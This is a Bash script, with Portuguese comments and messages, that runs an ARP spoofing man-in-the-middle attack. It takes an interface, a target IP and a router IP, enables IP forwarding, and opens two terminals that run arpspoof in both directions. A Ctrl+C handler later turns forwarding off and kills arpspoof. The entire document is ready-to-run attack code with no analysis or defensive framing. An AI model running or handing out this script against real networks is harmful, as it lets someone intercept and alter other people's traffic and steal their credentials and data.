#!/bin/bash

# Verificar argumentos
if [ "$#" -ne 3 ]; then
    echo "Uso: $0 <interface> <IP_DO_ALVO> <IP_DO_ROTEADOR>"
    exit 1
fi

INTERFACE=$1
TARGET_IP=$2
ROUTER_IP=$3

# Habilitar IP forwarding
echo "[*] Habilitando IP forwarding..."
echo 1 > /proc/sys/net/ipv4/ip_forward

# Executar arpspoof
echo "[*] Iniciando ARP spoofing..."
xfce4-terminal -- bash -c "arpspoof -i $INTERFACE -t $TARGET_IP $ROUTER_IP; exec bash"
xfce4-terminal -- bash -c "arpspoof -i $INTERFACE -t $ROUTER_IP $TARGET_IP; exec bash"

# Mensagem de controle
echo "[*] Pressione Ctrl+C para encerrar o ataque."

# Restaurar tabelas ARP ao encerrar
trap ctrl_c INT
function ctrl_c() {
    echo "[!] Encerrando ataque e restaurando tabelas ARP..."
    echo 0 > /proc/sys/net/ipv4/ip_forward
    killall arpspoof
    exit 0
}
wait
